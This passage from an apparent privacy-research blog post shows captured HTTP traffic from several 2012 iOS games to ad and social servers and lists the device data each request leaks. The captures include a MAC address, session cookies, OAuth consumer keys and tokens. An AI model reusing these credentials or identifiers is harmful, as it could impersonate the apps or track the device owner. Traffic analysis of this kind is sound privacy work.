		<div id="crayon-53c98e7aa9a83741906525" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /v3/publisher/content/?sdk-ios=1.10.4&amp;hardware=iPad1,1&amp;device=de5381e09b10d93043b50f43153f3aeeb4dcc589&amp;nonce=KvR0lOMv62EYvCUBxZx2vShBE6o&amp;session=&amp;languages=en,fr,de,ja,nl&amp;idiom=1&amp;os=iPhone+OS+5.1.1&amp;gid=vVUzpgmPxbzd2nFUTfTppE1f3-E&amp;placement_id=more_games&amp;metadata=1&amp;app=com.glu.wasteland&amp;connection=2&amp;token=a081c07329894f7f90703108fc4b658c&amp;signature=UYPsC-AxNZSpaLtc17u84_HzJ_k&amp;app_version=534 HTTP/1.1
Host: api2.playhaven.com
User-Agent: wasteland/534 CFNetwork/548.1.4 Darwin/11.0.0
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Pragma: no-cache
Connection: keep-alive
Proxy-Connection: keep-alive</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9a83741906525-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a83741906525-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9a83741906525-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a83741906525-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9a83741906525-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a83741906525-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9a83741906525-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a83741906525-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9a83741906525-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">v3</span><span class="crayon-o">/</span><span class="crayon-i">publisher</span><span class="crayon-o">/</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-sy">?</span><span class="crayon-i">sdk</span><span class="crayon-o">-</span><span class="crayon-v">ios</span><span class="crayon-o">=</span><span class="crayon-cn">1.10.4</span><span class="crayon-o">&amp;</span><span class="crayon-v">hardware</span><span class="crayon-o">=</span><span class="crayon-i">iPad1</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">device</span><span class="crayon-o">=</span><span class="crayon-i">de5381e09b10d93043b50f43153f3aeeb4dcc589</span><span class="crayon-o">&amp;</span><span class="crayon-v">nonce</span><span class="crayon-o">=</span><span class="crayon-i">KvR0lOMv62EYvCUBxZx2vShBE6o</span><span class="crayon-o">&amp;</span><span class="crayon-v">session</span><span class="crayon-o">=&amp;</span><span class="crayon-v">languages</span><span class="crayon-o">=</span><span class="crayon-i">en</span><span class="crayon-sy">,</span><span class="crayon-i">fr</span><span class="crayon-sy">,</span><span class="crayon-i">de</span><span class="crayon-sy">,</span><span class="crayon-i">ja</span><span class="crayon-sy">,</span><span class="crayon-i">nl</span><span class="crayon-o">&amp;</span><span class="crayon-v">idiom</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">os</span><span class="crayon-o">=</span><span class="crayon-i">iPhone</span><span class="crayon-o">+</span><span class="crayon-i">OS</span><span class="crayon-o">+</span><span class="crayon-cn">5.1.1</span><span class="crayon-o">&amp;</span><span class="crayon-v">gid</span><span class="crayon-o">=</span><span class="crayon-i">vVUzpgmPxbzd2nFUTfTppE1f3</span><span class="crayon-o">-</span><span class="crayon-i">E</span><span class="crayon-o">&amp;</span><span class="crayon-v">placement_id</span><span class="crayon-o">=</span><span class="crayon-i">more_games</span><span class="crayon-o">&amp;</span><span class="crayon-v">metadata</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">app</span><span class="crayon-o">=</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">glu</span><span class="crayon-sy">.</span><span class="crayon-i">wasteland</span><span class="crayon-o">&amp;</span><span class="crayon-v">connection</span><span class="crayon-o">=</span><span class="crayon-cn">2</span><span class="crayon-o">&amp;</span><span class="crayon-v">token</span><span class="crayon-o">=</span><span class="crayon-i">a081c07329894f7f90703108fc4b658c</span><span class="crayon-o">&amp;</span><span class="crayon-v">signature</span><span class="crayon-o">=</span><span class="crayon-i">UYPsC</span><span class="crayon-o">-</span><span class="crayon-i">AxNZSpaLtc17u84_HzJ_k</span><span class="crayon-o">&amp;</span><span class="crayon-v">app_version</span><span class="crayon-o">=</span><span class="crayon-cn">534</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a83741906525-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">api2</span><span class="crayon-sy">.</span><span class="crayon-v">playhaven</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9a83741906525-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">wasteland</span><span class="crayon-o">/</span><span class="crayon-cn">534</span><span class="crayon-h"> </span><span class="crayon-i">CFNetwork</span><span class="crayon-o">/</span><span class="crayon-cn">548.1.4</span><span class="crayon-h"> </span><span class="crayon-i">Darwin</span><span class="crayon-o">/</span><span class="crayon-cn">11.0.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a83741906525-4"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line" id="crayon-53c98e7aa9a83741906525-5"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a83741906525-6"><span class="crayon-i">Pragma</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">no</span><span class="crayon-o">-</span><span class="crayon-e">cache</span></div><div class="crayon-line" id="crayon-53c98e7aa9a83741906525-7"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a83741906525-8"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-i">alive</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0064 seconds] -->
<p>We see that this sends across a nonce, which is quite interesting. These are generally used to prevent Cross-Site Request Forgery. It also transmits:</p>
<ul>
<li>Mac Address</li>
<li>Device version</li>
<li>Unique identifier</li>
<li>A nonce</li>
<li>OS version</li>
<li>Application identifier</li>
<li>Connection (Radio type?)</li>
<li>A token</li>
<li>A signature</li>
<li>Application version</li>
</ul>
<p><strong>livewebapp.gameloft.com</strong><br />
Gameloft is a game developer which develops, publishes and distributes games for smartphones. Their games all talk to a couple of different domains. All of them are HTTP, but one application communicated with the livewebapp subdomain over both HTTP and HTTPS.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9a8d250690323" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /redir/iphoneloading.php?game=IAVI&amp;country=US&amp;lg=EN&amp;ver=1.7.0&amp;d=iPad1,1&amp;f=5.1.1&amp;udid=D8:30:62:70:D8:F7&amp;date_r=2012-07-20_16:42:22&amp;g_ver=1.0.4j&amp;dt=0&amp;ddate=2012-07-20_16:42:22 HTTP/1.1
Host: ingameads.gameloft.com
User-Agent: IceAge/1.0.4 CFNetwork/548.1.4 Darwin/11.0.0
Content-Length: 6
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Proxy-Connection: keep-alive

&amp;data=</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9a8d250690323-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a8d250690323-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9a8d250690323-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a8d250690323-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9a8d250690323-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a8d250690323-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9a8d250690323-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a8d250690323-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa9a8d250690323-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a8d250690323-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa9a8d250690323-11">11</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9a8d250690323-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">redir</span><span class="crayon-o">/</span><span class="crayon-v">iphoneloading</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">game</span><span class="crayon-o">=</span><span class="crayon-i">IAVI</span><span class="crayon-o">&amp;</span><span class="crayon-v">country</span><span class="crayon-o">=</span><span class="crayon-i">US</span><span class="crayon-o">&amp;</span><span class="crayon-v">lg</span><span class="crayon-o">=</span><span class="crayon-i">EN</span><span class="crayon-o">&amp;</span><span class="crayon-v">ver</span><span class="crayon-o">=</span><span class="crayon-cn">1.7.0</span><span class="crayon-o">&amp;</span><span class="crayon-v">d</span><span class="crayon-o">=</span><span class="crayon-i">iPad1</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">f</span><span class="crayon-o">=</span><span class="crayon-cn">5.1.1</span><span class="crayon-o">&amp;</span><span class="crayon-v">udid</span><span class="crayon-o">=</span><span class="crayon-i">D8</span><span class="crayon-o">:</span><span class="crayon-cn">30</span><span class="crayon-o">:</span><span class="crayon-cn">62</span><span class="crayon-o">:</span><span class="crayon-cn">70</span><span class="crayon-o">:</span><span class="crayon-i">D8</span><span class="crayon-o">:</span><span class="crayon-i">F7</span><span class="crayon-o">&amp;</span><span class="crayon-v">date_r</span><span class="crayon-o">=</span><span class="crayon-cn">2012</span><span class="crayon-o">-</span><span class="crayon-cn">07</span><span class="crayon-o">-</span><span class="crayon-cn">20_16</span><span class="crayon-o">:</span><span class="crayon-cn">42</span><span class="crayon-o">:</span><span class="crayon-cn">22</span><span class="crayon-o">&amp;</span><span class="crayon-v">g_ver</span><span class="crayon-o">=</span><span class="crayon-cn">1.0.4j</span><span class="crayon-o">&amp;</span><span class="crayon-v">dt</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-o">&amp;</span><span class="crayon-v">ddate</span><span class="crayon-o">=</span><span class="crayon-cn">2012</span><span class="crayon-o">-</span><span class="crayon-cn">07</span><span class="crayon-o">-</span><span class="crayon-cn">20_16</span><span class="crayon-o">:</span><span class="crayon-cn">42</span><span class="crayon-o">:</span><span class="crayon-cn">22</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a8d250690323-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">ingameads</span><span class="crayon-sy">.</span><span class="crayon-v">gameloft</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9a8d250690323-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">IceAge</span><span class="crayon-o">/</span><span class="crayon-cn">1.0.4</span><span class="crayon-h"> </span><span class="crayon-i">CFNetwork</span><span class="crayon-o">/</span><span class="crayon-cn">548.1.4</span><span class="crayon-h"> </span><span class="crayon-i">Darwin</span><span class="crayon-o">/</span><span class="crayon-cn">11.0.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a8d250690323-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">6</span></div><div class="crayon-line" id="crayon-53c98e7aa9a8d250690323-5"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a8d250690323-6"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line" id="crayon-53c98e7aa9a8d250690323-7"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a8d250690323-8"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line" id="crayon-53c98e7aa9a8d250690323-9"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-i">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a8d250690323-10">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9a8d250690323-11"><span class="crayon-o">&amp;</span><span class="crayon-v">data</span><span class="crayon-o">=</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0061 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9a96316869600" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /redir/ads/splashscreen_click.php?id=MzY3OCMyMTMyOSM5OCNmcm9tPUlBVkkmY291bnRyeT1VUyZsZz1FTiZ1ZGlkPUQ4OjMwOjYyOjcwOkQ4OkY3JmQ9aVBhZDEsMSZmPTUuMS4xJmdhbWVfdmVyPTEuMC40ag==&amp;lid=24970 HTTP/1.1
Host: ingameads.gameloft.com
Accept-Language: en
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
Connection: close
Cookie: PHPSESSID=5753c4a4a01f1bd623b5f87a3caf6a81</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9a96316869600-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a96316869600-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9a96316869600-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a96316869600-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9a96316869600-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a96316869600-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9a96316869600-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">redir</span><span class="crayon-o">/</span><span class="crayon-i">ads</span><span class="crayon-o">/</span><span class="crayon-v">splashscreen_click</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-v">MzY3OCMyMTMyOSM5OCNmcm9tPUlBVkkmY291bnRyeT1VUyZsZz1FTiZ1ZGlkPUQ4OjMwOjYyOjcwOkQ4OkY3JmQ9aVBhZDEsMSZmPTUuMS4xJmdhbWVfdmVyPTEuMC40ag</span><span class="crayon-o">==</span><span class="crayon-o">&amp;</span><span class="crayon-v">lid</span><span class="crayon-o">=</span><span class="crayon-cn">24970</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a96316869600-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">ingameads</span><span class="crayon-sy">.</span><span class="crayon-v">gameloft</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9a96316869600-3"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">en</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a96316869600-4"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">4.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">compatible</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">MSIE</span><span class="crayon-h"> </span><span class="crayon-cn">7.0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.0</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c98e7aa9a96316869600-5"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">close</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a96316869600-6"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">PHPSESSID</span><span class="crayon-o">=</span><span class="crayon-cn">5753c4a4a01f1bd623b5f87a3caf6a81</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0032 seconds] -->
<p>What is interesting in this case is that the first request, which says that the application is loading, has all data in plain text. The second request is sending across an &#8220;id&#8221;. But this ID is in fact simply a base64 encoded string of the very same data as that above. But we can tell it sends:</p>
<ul>
<li>Application identifier</li>
<li>Country</li>
<li>Language</li>
<li>Application version</li>
<li>Device version</li>
<li>OS version</li>
<li>Mac Address (Unique identifier)</li>
<li>A timestamp</li>
</ul>
<p><strong>api.openfeint.com</strong><br />
Openfeint is probably the biggest social networking component used by major games. It adds features such as leaderboards, friends lists, and such thing. It communicates over HTTPS, as you&#8217;d expect from any sort of application that communicates large amount of data about your device.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9aa0500821574" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /client_applications/329833/forums/announcements.xml?since=Sat%2C%2030%20Dec%200001%2000%3A00%3A00%20%2B0000&amp;info_client_application_version=2012.06.19&amp;info_client_application_bundle_id=net.skyvu.battlebearsroyal&amp;info_client_openfeint_version=3282012&amp;info_client_device_locale=en_US&amp;session_id=0A5C725E-EE63-40C5-8E4A-E19EC7E381E2&amp;parental_controls_enabled=false&amp;oauth_consumer_key=y2svaURF4NbnwKvrXa5xQ&amp;oauth_signature_method=HMAC-SHA1&amp;oauth_timestamp=1342817690&amp;oauth_nonce=AAB3E5CB-ED31-4E6D-9630-8B77904B017B&amp;oauth_version=1.0&amp;oauth_signature=7Go5eBWufm6gST2w5h9yeDybnfc%3D HTTP/1.1
Host: api.openfeint.com
User-Agent: battlebearsroyal/2012.06.19 CFNetwork/548.1.4 Darwin/11.0.0
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: keep-alive
Proxy-Connection: keep-alive</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9aa0500821574-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9aa0500821574-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9aa0500821574-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9aa0500821574-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9aa0500821574-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9aa0500821574-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9aa0500821574-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9aa0500821574-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">client_applications</span><span class="crayon-o">/</span><span class="crayon-cn">329833</span><span class="crayon-o">/</span><span class="crayon-i">forums</span><span class="crayon-o">/</span><span class="crayon-v">announcements</span><span class="crayon-sy">.</span><span class="crayon-i">xml</span><span class="crayon-sy">?</span><span class="crayon-v">since</span><span class="crayon-o">=</span><span class="crayon-i">Sat</span><span class="crayon-o">%</span><span class="crayon-cn">2C</span><span class="crayon-o">%</span><span class="crayon-cn">2030</span><span class="crayon-o">%</span><span class="crayon-cn">20Dec</span><span class="crayon-o">%</span><span class="crayon-cn">200001</span><span class="crayon-o">%</span><span class="crayon-cn">2000</span><span class="crayon-o">%</span><span class="crayon-cn">3A00</span><span class="crayon-o">%</span><span class="crayon-cn">3A00</span><span class="crayon-o">%</span><span class="crayon-cn">20</span><span class="crayon-o">%</span><span class="crayon-cn">2B0000</span><span class="crayon-o">&amp;</span><span class="crayon-v">info_client_application_version</span><span class="crayon-o">=</span><span class="crayon-cn">2012.06.19</span><span class="crayon-o">&amp;</span><span class="crayon-v">info_client_application_bundle_id</span><span class="crayon-o">=</span><span class="crayon-v">net</span><span class="crayon-sy">.</span><span class="crayon-v">skyvu</span><span class="crayon-sy">.</span><span class="crayon-i">battlebearsroyal</span><span class="crayon-o">&amp;</span><span class="crayon-v">info_client_openfeint_version</span><span class="crayon-o">=</span><span class="crayon-cn">3282012</span><span class="crayon-o">&amp;</span><span class="crayon-v">info_client_device_locale</span><span class="crayon-o">=</span><span class="crayon-i">en_US</span><span class="crayon-o">&amp;</span><span class="crayon-v">session_id</span><span class="crayon-o">=</span><span class="crayon-cn">0A5C725E</span><span class="crayon-o">-</span><span class="crayon-i">EE63</span><span class="crayon-o">-</span><span class="crayon-cn">40C5</span><span class="crayon-o">-</span><span class="crayon-cn">8E4A</span><span class="crayon-o">-</span><span class="crayon-i">E19EC7E381E2</span><span class="crayon-o">&amp;</span><span class="crayon-v">parental_controls_enabled</span><span class="crayon-o">=</span><span class="crayon-t">false</span><span class="crayon-o">&amp;</span><span class="crayon-v">oauth_consumer_key</span><span class="crayon-o">=</span><span class="crayon-i">y2svaURF4NbnwKvrXa5xQ</span><span class="crayon-o">&amp;</span><span 